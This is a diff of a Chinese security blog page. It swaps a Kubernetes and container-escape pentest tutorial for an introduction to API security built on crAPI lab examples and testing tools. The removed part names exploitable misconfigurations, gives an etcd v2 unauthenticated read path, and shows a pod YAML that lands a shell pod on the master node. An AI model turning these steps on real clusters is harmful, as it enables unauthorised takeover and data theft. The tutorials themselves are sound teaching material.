-<p><strong>CDK（Container Penetration Toolkit）</strong> 是一个零依赖的容器渗透测试工具包。它的核心价值在于：你只需把一个静态编译的二进制文件丢进目标容器里，就能直接运行，不需要容器内预装 Python、curl 或任何其他环境。</p>
-<p>项目地址：<a href="https://github.com/cdk-team/CDK">CDK项目地址</a>
-注意：工具时常会报错，当工具检测出不能够逃逸的时候，手动测试往往更加有效。
-如下图所示，与 1.2 小节 docker 特权模式判断与利用 同样的容器环境，手动测试已经成功逃逸，但自动化测试检测结果却表示无法逃逸：
-<img src="http://tuchuang.mrlxl.cn/picture/20261116160010388.png" alt=""></p>
-<h2 id="二kubernetesk8s">二.Kubernetes（K8s）</h2>
-<blockquote>
-<p>K8s 是 Kubernetes 的缩写，它是一个开源的容器编排系统，用于自动化部署、扩缩和管理容器化应用。当应用被拆分成很多容器，并在多台服务器上运行时，如何确定每个容器在哪台主机上。手动管理（比如挂了重启、流量大了扩容）会非常麻烦。而 K8s 能够自动帮你搞定这些事情。可以理解成一个分布式操作系统的抽象层。</p>
-</blockquote>
-<p>如下图所示，展示了 K8s 可能存在的攻击点：
-<img src="http://tuchuang.mrlxl.cn/picture/20261117094824121.png" alt="K8s 可能存在的攻击点"></p>
-<p>如下图所示，已经搭建好一个简易的 k8s 集群，作为实验环境：
-<img src="http://tuchuang.mrlxl.cn/picture/20261118140857373.png" alt="简易的 k8s 集群"></p>
-<h3 id="21-master-node-问题">2.1 Master Node 问题</h3>
-<p>Master 是 <strong>整个 Kubernetes 集群的控制平面结点</strong>，负责 <strong>管理、调度、控制整个集群。</strong></p>
-<hr>
+<p>简单来说，API 就是服务器对外开的一个“窗口”，外部程序通过这个窗口按规则请求功能，服务器返回结果。<strong>只要是用于规范“如何调用功能、如何交换数据”的接口，都可以抽象成为 API。</strong></p>
+<h3 id="12-api-标准">1.2 API 标准</h3>
+<p>API 标准的 <strong>API 文档最小完备集合</strong> 包含以下<strong>八点</strong>，任何一个对外 API，少一个都算 “不规范” ：</p>
 <ol>
-<li><strong>遗留的 8080 端口（旧版本：低于 1.16 版本）</strong>：</li>
+<li><strong>服务器地址：</strong> 用于说明 API 所在的服务器域名或 IP 地址。</li>
+<li><strong>通信协议 / 通信地址（Protocol）：</strong> 指明接口采用的通信协议，如 HTTP 或 HTTPS，其中 HTTPS 为当前主流的安全通信方式。</li>
+<li><strong>Endpoint（接口路径）：</strong> 采用一个接口（接口功能）对应一个 url 这样是非常方便的。</li>
+<li><strong>版本：</strong> 防止接口升级，与其对接的其他系统没有改，导致客户端炸了。</li>
+<li><strong>消息格式：</strong> 数据长什么样，是 XML，json? 2026年最近几年常用的是 json。</li>
+<li><strong>请求响应字段描述：</strong> 对接口请求参数和返回数据的字段名称、类型、含义及是否必填进行详细说明，是 API 文档的核心部分。</li>
+<li><strong>响应码：</strong> 程序判断成功/失败的依据，响应码的描述就是是给非技术业务人员看的那些，本质就是像 IDE 中代码报错内容的再封装。</li>
+<li><strong>接口安全要求：</strong> 身份认证，鉴权，比如 API Key。</li>
 </ol>
-<p>早期 K8s 的 API Server 会监听一个 8080 端口，这个端口设计上就没有认证和授权检查，原本只给本机测试用。如果管理员把它绑定到了 0.0.0.0 并对公网开放，任何人 curl 一下就能直接操控集群。新版本已默认关闭，但旧集群或错误配置仍可能残留。</p>
-<hr>
-<ol start="2">
-<li><strong>把“匿名用户”提拔成了管理员</strong>：</li>
-</ol>
-<p>K8s 有一个内置的匿名身份叫 system:anonymous。默认情况下它几乎没有权限，但如果运维人员错误地把这个匿名用户绑定到了 cluster-admin 角色，任何没有凭据的请求都会自动获得集群最高权限。注意：现在的 API Server 默认是在 6443 端口。</p>
-<p>浏览器直接访问能获取大量信息：
-<img src="http://tuchuang.mrlxl.cn/picture/20261118144937306.png" alt="把“匿名用户”提拔成了管理员">
-用 kubectl 这样的官方客户端工具访问能够获取更多敏感信息：
-<img src="http://tuchuang.mrlxl.cn/picture/20261118154830017.png" alt="kubectl获取更多敏感信息">
-还能够创建一个自定义 Pod，把 Node1 宿主机根目录挂载进 Pod，从而实现容器逃逸，读写宿主机系统文件，通过 crontab 拿到 Node1 宿主机 shell：
-<img src="http://tuchuang.mrlxl.cn/picture/20261118170051875.png" alt="拿到 Node1 宿主机 shell"></p>
-<hr>
-<ol start="3">
-<li><strong>Etcd 未授权访问</strong>：</li>
-</ol>
-<p>etcd 是 Master 结点上的一个数据库，集群所有配置、所有资源（Node、Pod、Secret、ConfigMap、权限、证书）全部存在 etcd 里面。</p>
-<p>etcd 默认监听两个端口（默认只监听本机访问）：
-<strong>2379：客户端端口（APIServer、etcdctl 读写数据用）。</strong>
-2380：集群 Raft 通信端口，只用于 etcd 节点之间同步数据，客户端不访问这个。</p>
-<p>etcd 分为两个版本，V2 版本和 V3 版本，Kubernetes 1.11 之后默认全部使用 etcd v3 API。</p>
-<p><strong>V2 版本的漏洞</strong> 比较好利用：
-直接访问如下路径，有数据就是利用成功。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">目标</span><span class="n">IP</span><span class="o">&gt;:</span><span class="mi">2379</span><span class="o">/</span><span class="n">v2</span><span class="o">/</span><span class="n">keys</span><span class="o">/</span><span class="n">discovery</span><span class="o">?</span><span class="n">recursive</span><span class="o">=</span><span class="nb">true</span>
-</span></span></code></pre></div><p>一个案例如下所示：
-<img src="http://tuchuang.mrlxl.cn/picture/20261121173653175.png" alt="一个案例">
-利用不成功，没有数据的话，就是 V3 版本，按照 V3 版本的来。</p>
-<p><strong>V3 版本的漏洞</strong>：
-<strong>第一种：未开启客户端证书校验 + 暴露 0.0.0.0</strong>：
-<img src="http://tuchuang.mrlxl.cn/picture/20261119153657879.png" alt="第一种"></p>
-<p><strong>第二种：使用 ssrf 漏洞</strong>：
-可能存在配置为外部访问需要证书，此时外部访问的漏洞利用很难。但要是本地不需要证书校验，此时若在本地上存在一个 ssrf 漏洞就能够绕过证书校验。</p>
-<hr>
-<ol start="4">
-<li><strong>DashBoard 未授权访问</strong>：</li>
-</ol>
-<p>DashBoard 是一个用来管理控制面板的图形化界面，其错误配置可能存在跳过验证的行为导致未授权访问:
-<img src="http://tuchuang.mrlxl.cn/picture/20261122105533167.png" alt="DashBoard未授权访问">
-接下来可以创建恶意 pod，将宿主机根目录挂载到 pod 的一个路径，这样就能够读取宿主机的任意一个文件了：
-<img src="http://tuchuang.mrlxl.cn/picture/20261122110926836.png" alt="挂载根目录">
-还可以通过执行反弹链接控制宿主机：
-<img src="http://tuchuang.mrlxl.cn/picture/20261122111636135.png" alt="执行反弹链接"></p>
-<p>值得注意的是：从 Dashboard v7.0.0 开始，登录界面无法再被禁用或跳过。</p>
-<hr>
-<ol start="5">
-<li><strong>kubeconfig 文件泄露</strong>：</li>
-</ol>
-<p>kubeconfig 这个配置文件中有很多信息，比如集群的管理凭证，API Server 地址，服务端证书等。</p>
-<p>开发或运维人员在办公电脑上做实验、调试时，把 ~/.kube/config 误传到 GitHub、网盘，或者服务器被 WebShell 后，攻击者顺手打包走了这个文件。</p>
-<p>若是攻击者获得了这个文件，可以直接通过 kubectl 使用 config 进行链接从而接管整个集群（上方的 Dashboard 的图形化界面也有使用 config 进行连接的选项），获得文件之后的逃逸过程和上方的 Dashboard 登录跳过之后泄露是一样的。</p>
-<p>若是没有图形化界面，用 kubectl 也是一样的，这里做一个示例：
-<img src="http://tuchuang.mrlxl.cn/picture/20261122120045835.png" alt="kubeconfig 文件泄露"></p>
-<hr>
-<ol start="6">
-<li><strong>横向移动中的 Taint 污点绕过问题</strong>：</li>
-</ol>
-<p>Taint 是调度管理机制，用于防止普通工作负载被调度到不合适的节点，而不是阻止恶意用户访问节点。创建的 pod 必须要有容忍污点的配置才能让创建的恶意 pod 运行在指定的主机上面。</p>
-<p>这个问题是在攻击者获得能够创建 pod 的权限的时候才考虑的，一个案例如下：
-<img src="http://tuchuang.mrlxl.cn/picture/20261122182436719.png" alt="">
-创建这个 pod 的 yaml 是这样的：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">kind: Pod
-</span></span><span class="line"><span class="cl">metadata:
-</span></span><span class="line"><span class="cl">  name: master-shell
-</span></span><span class="line"><span class="cl">  namespace: default
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">spec:
-</span></span><span class="line"><span class="cl">  # 指定 Pod 调度到 Master 节点
-</span></span><span class="line"><span class="cl">  nodeSelector:
-</span></span><span class="line"><span class="cl">    kubernetes.io/hostname: k8s-master
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  # 容忍 Master 节点上的污点
-</span></span><span class="line"><span class="cl">  tolerations:
-</span></span><span class="line"><span class="cl">    # 容忍自定义污点 lab=taint-demo:NoSchedule
-</span></span><span class="line"><span class="cl">    - key: lab
-</span></span><span class="line"><span class="cl">      operator: Equal
-</span></span><span class="line"><span class="cl">      value: taint-demo
-</span></span><span class="line"><span class="cl">      effect: NoSchedule
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    # 容忍 Kubernetes 默认的控制平面污点
-</span></span><span class="line"><span class="cl">    - key: node-role.kubernetes.io/control-plane
-</span></span><span class="line"><span class="cl">      operator: Exists
-</span></span><span class="line"><span class="cl">      effect: NoSchedule
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  # 不自动挂载 Kubernetes ServiceAccount Token
-</span></span><span class="line"><span class="cl">  automountServiceAccountToken: false
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  containers:
-</span></span><span class="line"><span class="cl">    - name: shell
-</span></span><span class="line"><span class="cl">      image: busybox:1.36
-</span></span><span class="line"><span class="cl">      imagePullPolicy: IfNotPresent
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">      # 启动 Shell 并保持容器运行，方便 Exec 进入
-</span></span><span class="line"><span class="cl">      command:
-</span></span><span class="line"><span class="cl">        - /bin/sh
-</span></span><span class="line"><span class="cl">        - -c
-</span></span><span class="line"><span class="cl">        - sleep 3600
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">      # 容器安全权限配置
-</span></span><span class="line"><span class="cl">      securityContext:
-</span></span><span class="line"><span class="cl">        # 不开启特权模式（Privileged）
-</span></span><span class="line"><span class="cl">        privileged: false
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        # 禁止进程提升权限
-</span></span><span class="line"><span class="cl">        allowPrivilegeEscalation: false
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">        # 删除全部 Linux Capabilities
-</span></span><span class="line"><span class="cl">        capabilities:
-</span></span><span class="line"><span class="cl">          drop:
-</span></span><span class="line"><span class="cl">            - ALL
-</span></span></code></pre></div><hr>
-<h3 id="22-worker-node-问题">2.2 Worker Node 问题</h3>
+<p>详细结构可参考 <strong>OpenAPI 规范（以前也叫 Swagger 规范，是应用及其广泛的规范）</strong> ，这是一个将 API 的各项定义和结构以“图/树”的方式展示出来，帮助开发者理解规范本身的组织和含义的 <strong>可视化浏览规范</strong>（末尾链接）</p>
+<h3 id="13-api-类型">1.3 API 类型</h3>
+<p>API 的类型也多种多样，不只是我们常看见的 Web API，手机 APP 的功能调用、电脑操作系统对底层硬件设备的访问，乃至对各类外部设备的控制，都是可以用 API 来完成。而几种常见的 <strong>常见的 API 架构风格</strong> 如下：</p>
 <ol>
-<li><strong>Worker 节点 kubelet 10250 HTTPS 端口未授权访问漏洞</strong>（云原生经典 Node 侧漏洞）:
-这是一个 运维/管理员 为了图方便而造成的漏洞，配置文件 <code>/var/lib/kubelet/config.yaml</code> 中两项错误配置：
+<li><strong>SOAP / WebService（HTTP + XML）</strong>：银行、政务、企业级老系统。<strong>SOAP 的说明书是 WSDL</strong>。<strong>特征</strong>：在服务地址后加上 ?wsdl 能够获取接口规范文档（XML）。</li>
+<li><strong>GraphQL API</strong>：Facebook、GitHub、现代移动应用后台、微服务聚合场景。GraphQL 的说明书是它自带的 Schema。</li>
+<li><strong>RESTful API（HTTP + JSON）</strong>：绝大多数互联网公司、开源服务、第三方开放接口。<strong>RESTful 的说明书通常是 OpenAPI (Swagger) 或 WADL</strong>。<strong>特征</strong>：常常语义化 url ，比如 Fofa 的 API 请求接口是 <a href="https://fofa.info/api/v1/search/all">https://fofa.info/api/v1/search/all</a> url 里面带资源化路径，含版本号。</li>
+</ol>
+<h3 id="14-api-文档">1.4 API 文档</h3>
+<p>当 API 发生改动，就需要维护 API 文档发送给使用这个 API 的人，现在各大厂商已经有了各种 API 开放平台，方便用户调用，可自行搜索。
+以 fofa 的 API 为例（需购买 API key），其提供大量参数供用户自行编写 API 调用功能可实现批量挖掘漏洞。
+<img src="http://tuchuang.mrlxl.cn/picture/20260220200626344.png" alt="fofa API"></p>
+<p>维护 API 文档非常麻烦。所谓有痛点就有市场，有市场就有解决方案。目前 API 文档的编写已经有了大量的自动化工具，<strong>Swagger（Swagger泄露是一个常见的漏洞，要掌握）</strong> 就是其中一种。</p>
+<p>API 安全并不是一个独立的安全，因为 API 几乎是无处不在的，其实如果有学过WEB等漏洞内容的就已经接触到一部分 API 的内容了。</p>
+<h2 id="二-api安全概述">二. API安全概述</h2>
+<h3 id="21-api-安全目标与常见威胁">2.1 API 安全目标与常见威胁</h3>
+<p>API 安全无法与其他的一些安全切割开来，与诸如网络安全（通信双方的安全），信息安全和应用安全（应用从编码到使用的安全，如 web top10），肯定会存在相通的地方，只是侧重点不同。
+API 安全的目标 <strong>主要</strong> 就是我们老生常谈的信息系统安全三要素（CIA）：</p>
+<ul>
+<li>机密性</li>
+<li>完整性</li>
+<li>可用性</li>
+</ul>
+<p>关于 API 的常见威胁，这里依照的是 <strong>微软</strong> 的威胁建模工具（末尾链接），微软官方文档给出了详细的教程。
+微软将不同类型的威胁分类成以下六点，以简化整体安全交流：</p>
+<ul>
+<li><strong>欺骗：</strong>	先进行非法访问，并使用另一用户的身份验证信息，例如用户名和密码。</li>
+<li><strong>篡改：</strong>	恶意修改数据。 示例包括未经授权更改持久保存的数据（例如保存在数据库中的数据），更改通过开放网络（例如 Internet）在两台计算机之间传输的数据。</li>
+<li><strong>抵赖：</strong>	指用户拒绝执行某个操作，但其他操作方无法证实这种拒绝无效 - 例如，某个用户在无法跟踪受禁操作的系统中执行非法操作。 不可否认性是指系统对抗否认性威胁的能力。 例如，购买某个产品的用户可能需要在收货时签收该产品。 然后，供应商可以使用签收单来证明该用户确实收到了包裹。</li>
+<li><strong>信息泄露：</strong>	将信息透露给本应不该有权访问这些信息的个人 — 例如，用户能够读取他们未授权访问的文件，或者入侵者能够读取在两台计算机之间传输的数据。</li>
+<li><strong>拒绝服务：</strong>	拒绝服务 (DoS) 攻击会拒绝向有效用户提供服务 — 例如，使 Web 服务器暂时不可用。 必须防范某些类型的 DoS 威胁，这只是为了提高系统的可用性和可靠性。</li>
+<li><strong>越权：</strong>	无特权用户获得特权访问权限，从而拥有足够的访问权限来入侵或破坏整个系统。 特权提升威胁包括攻击者有效突破系统防御，成为受信任系统本身的一部分，这是非常危险的情况。</li>
+</ul>
+<p>截止 2026 年底，Owasp API Top 10 漏洞只更新到 2023 年版，如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20260224220153845.png" alt="API常见威胁">
+书面化的内容看着很懵，后面会通过靶场实战的方式对这些漏洞做详细介绍。</p>
+<h3 id="22-api-安全检查点靶场示例">2.2 API 安全检查点（靶场示例）</h3>
+<p>手工测试 API 其实就是在测试接口有没有认证、授权、输入验证、业务逻辑等漏洞，和测试 Web Top 10 漏洞（基础）其实差不多。以下以 CrAPI 靶场为例进行整理。</p>
+<h4 id="221-失效的对象级别授权水平越权">2.2.1 失效的对象级别授权（水平越权）</h4>
+<p>CrAPI 靶场对任意车辆定位：
+<img src="http://tuchuang.mrlxl.cn/picture/20261127113256224.png" alt="任意车辆定位"></p>
+<h4 id="222-失效的对象身份验证">2.2.2 失效的对象身份验证</h4>
+<p>crAPI 靶场爆破修改用户密码：
+<img src="http://tuchuang.mrlxl.cn/picture/20261127115955587.png" alt="失效的对象身份验证">
+从上述例子中也能看出，旧版本的 API 往往包含更多的漏洞，若测试对象对旧版本的 API 安全管理不当，可能导致漏洞，如 Restful 这种风格的 API，/api/auth/v3/ 直接改成 /api/auth/v2/ 去进行验证一下是否也能拿到数据。</p>
+<h4 id="223-资源缺乏和速率限制">2.2.3 资源缺乏和速率限制</h4>
+<p>资源缺乏和速率限制主要是由接口中的某个参数而导致的 DDOS 攻击，如图所示：
+<img src="http://tuchuang.mrlxl.cn/picture/20261127140729089.png" alt="资源缺乏和速率限制"></p>
+<h4 id="224-失效的功能级授权垂直越权">2.2.4 失效的功能级授权（垂直越权）</h4>
+<p>CrAPI 使用了前端未提供但后端有实现的删除视频功能：
+<img src="http://tuchuang.mrlxl.cn/picture/20261127142531212.png" alt="失效的功能级授权"></p>
+<h4 id="225-批量分配">2.2.5 批量分配</h4>
+<p>现代开发框架为了提升效率，通常提供自动绑定功能（如将 JSON 请求体直接映射为对象）。如果开发者没有对客户端可修改的字段做白名单限制，就可能导致漏洞。</p>
+<p>举个例子：用户编辑个人资料的正常请求是 {&ldquo;user_name&rdquo;:&ldquo;inons&rdquo;,&ldquo;age&rdquo;:24}。但攻击者通过抓包，在请求中额外添加一个 {&ldquo;credit_balance&rdquo;:99999}。如果后端直接绑定了所有字段，攻击者就凭空获得了大量余额。</p>
+<p>CrAPI 靶场退款功能未校验：
+<img src="http://tuchuang.mrlxl.cn/picture/20261127151757063.png" alt="CrAPI 靶场退款功能"></p>
+<h4 id="226-ssrf">2.2.6 SSRF</h4>
+<p>CrAPI 靶场 SSRF 漏洞：
+<img src="http://tuchuang.mrlxl.cn/picture/20261127153617310.png" alt="CrAPI 靶场 SSRF 漏洞"></p>
+<h3 id="23-api-漏洞检测相关工具">2.3 API 漏洞检测相关工具</h3>
+<h4 id="231-postman-有官方维护的软件">2.3.1 Postman （有官方维护的软件）</h4>
+<p>Postman 的主要作用是测试 API 的连通性和功能正确性，并不是直接进行漏洞检测。一般是和其他工具进行联动才能进行 API 自动化漏洞检测。</p>
+<p>这个工具可以导入 API 文档（url 导入也行）以用于很方便的测试 API 接口（批量测试也方便），示例如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20261127183047280.png" alt="Postman示例"></p>
+<h4 id="232-jsfinder-命令行工具">2.3.2 Jsfinder （命令行工具）</h4>
+<p>现代 Web 应用（尤其是单页应用）的前端逻辑几乎全在 JavaScript 里。前端需要调用后端接口来获取数据或执行操作，因此所有被前端代码使用的 API 路径、参数名称，都会被硬编码或打包进 JavaScript 文件中。</p>
+<p>Jsfinder 可用于检测前端 JavaScript 中 API 路径、参数名称等。从而整理出一份 “简略的 API 文档”。</p>
+<p>用 FindSomething 浏览器插件也是一样的。</p>
+<h4 id="233-apikitbp-插件">2.3.3 APIKit（BP 插件）</h4>
+<p>APIKit 有两种模式：</p>
 <ol>
-<li><code>authentication.anonymous.enabled: true</code> 开启<strong>匿名认证</strong>，没有 token / 客户端证书也能访问 kubelet API。</li>
-<li><code>authorization.mode: AlwaysAllow</code> 鉴权策略永久放行，<strong>不向 apiserver 校验权限</strong>，任何请求直接允许执行。</li>
+<li>
+<p><strong>被动模式</strong>：只要访问的流量经过 BP 且 APIKit 开启了 Auto Request Sending。它就能 <strong>自动发现接口</strong>：你只要访问一个网页，它能在后台自动把网页加载的 .js 文件或 openapi.json 全部分析一遍，把隐藏的接口全扒出来。还能 <strong>自动填入参数</strong>：它分析完文档后，知道某个接口需要 username 参数，它会自动填上 test 或者字典，然后发出去测试。告诉你 <strong>哪些接口没鉴权（Unauth: true）。</strong></p>
+</li>
+<li>
+<p><strong>主动模式（右键数据包）</strong>：</p>
+<ol>
+<li><strong>Do Auto API scan</strong>：需要是一个普通的业务请求，不能是接口文档。会自动探测使用什么类型的 API，若是 APIKit 开启 Auto Request Sending 还能够发包探测漏洞。</li>
+<li><strong>Do Target API scan</strong>：已经知道 API 文档位置，并且判断出来 API 文档类型的时候使用。</li>
 </ol>
 </li>
 </ol>
-<p>这样的配置直接能够导致远程命令执行：</p>
-<table>
-  <thead>
-      <tr>
-          <th>可利用接口</th>
-          <th>作用</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td><code>/pods</code></td>
-          <td>列出当前节点上全部 Pod、容器元数据</td>
-      </tr>
-      <tr>
-          <td><code>/run/{ns}/{pod}/{container}</code></td>
-          <td>POST 请求，<strong>在目标容器内执行任意命令（RCE）</strong>，本次实验利用的核心接口<br>{ns}：命名空间 namespace；{pod}：Pod 名称；{container}：容器名称</td>
-      </tr>
-      <tr>
-          <td><code>/exec</code></td>
-          <td>交互式进入容器（需要流式连接，curl 不好直接用）</td>
-      </tr>
-      <tr>
-          <td><code>/containerLogs</code></td>
-          <td>直接读取容器日志</td>
-      </tr>
-  </tbody>
-</table>
-<p><img src="http://tuchuang.mrlxl.cn/picture/20261118181744883.png" alt="10250 HTTPS 端口未授权"></p>
+<p>一次主动探测示例如图所示：
+<img src="http://tuchuang.mrlxl.cn/picture/20261127180103387.png" alt="示例"></p>
+<h4 id="234-xray">2.3.4 Xray</h4>
+<p>xray 是一个全面的漏洞扫描器，能主动检测 SQL 注入、XSS、命令注入等多种 Web 漏洞，可以和 Postman 配合使用。</p>
+<p>Postman + Xray 联动如下：
+<img src="http://tuchuang.mrlxl.cn/picture/20261127191442971.png" alt="Postman + Xray 联动"></p>
+<h1 id="附言">附言</h1>
+<p>资料链接：https://pan.baidu.com/s/1ek3_L1V_qCy_Vydz3bU0JQ?pwd=8888 提取码: 8888
+<a href="https://openapi-map.apihandyman.io/">OpenAPI 规范</a>
+<a href="https://openapi.apifox.cn/">OPEN API 中文文档</a>
+工具下载直接问 AI 即可。</p>
 
     </article>
     <p style="text-align: center; margin-top: 50px; opacity: 0.6; font-size: 0.9em;">总是在探索未知</p>
@@ -1420,24 +1240,42 @@ Docker 的特权模式由启动容器时的 &ndash;privileged 参数控制。
     <h3>大纲</h3>
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#云原生安全">云原生安全</a>
+    <li><a href="#api安全">API安全</a>
       <ul>
-        <li><a href="#一-docker-逃逸">一. docker 逃逸</a>
+        <li><a href="#一-api基础知识">一. API基础知识</a>
           <ul>
-            <li><a href="#11-docker-空间识别">1.1 docker 空间识别</a></li>
-            <li><a href="#12-docker-特权模式判断与利用">1.2 docker 特权模式判断与利用</a></li>
-            <li><a href="#13-docker-危险挂载">1.3 docker 危险挂载</a></li>
-            <li><a href="#14-cdk-自动化渗透">1.4 CDK 自动化渗透</a></li>
+            <li><a href="#11-api-概念">1.1 API 概念</a></li>
+            <li><a href="#12-api-标准">1.2 API 标准</a></li>
+            <li><a href="#13-api-类型">1.3 API 类型</a></li>
+            <li><a href="#14-api-文档">1.4 API 文档</a></li>
           </ul>
         </li>
-        <li><a href="#二kubernetesk8s">二.Kubernetes（K8s）</a>
+        <li><a href="#二-api安全概述">二. API安全概述</a>
           <ul>
-            <li><a href="#21-master-node-问题">2.1 Master Node 问题</a></li>
-            <li><a href="#22-worker-node-问题">2.2 Worker Node 问题</a></li>
+            <li><a href="#21-api-安全目标与常见威胁">2.1 API 安全目标与常见威胁</a></li>
+            <li><a href="#22-api-安全检查点靶场示例">2.2 API 安全检查点（靶场示例）</a>
+              <ul>
+                <li><a href="#221-失效的对象级别授权水平越权">2.2.1 失效的对象级别授权（水平越权）</a></li>
+                <li><a href="#222-失效的对象身份验证">2.2.2 失效的对象身份验证</a></li>
+                <li><a href="#223-资源缺乏和速率限制">2.2.3 资源缺乏和速率限制</a></li>
+                <li><a href="#224-失效的功能级授权垂直越权">2.2.4 失效的功能级授权（垂直越权）</a></li>
+                <li><a href="#225-批量分配">2.2.5 批量分配</a></li>
+                <li><a href="#226-ssrf">2.2.6 SSRF</a></li>
+              </ul>
+            </li>
+            <li><a href="#23-api-漏洞检测相关工具">2.3 API 漏洞检测相关工具</a>
+              <ul>
+                <li><a href="#231-postman-有官方维护的软件">2.3.1 Postman （有官方维护的软件）</a></li>
+                <li><a href="#232-jsfinder-命令行工具">2.3.2 Jsfinder （命令行工具）</a></li>
+                <li><a href="#233-apikitbp-插件">2.3.3 APIKit（BP 插件）</a></li>
+                <li><a href="#234-xray">2.3.4 Xray</a></li>
+              </ul>
+            </li>
           </ul>
         </li>
       </ul>
     </li>
+    <li><a href="#附言">附言</a></li>
   </ul>
 </nav>
   </div>
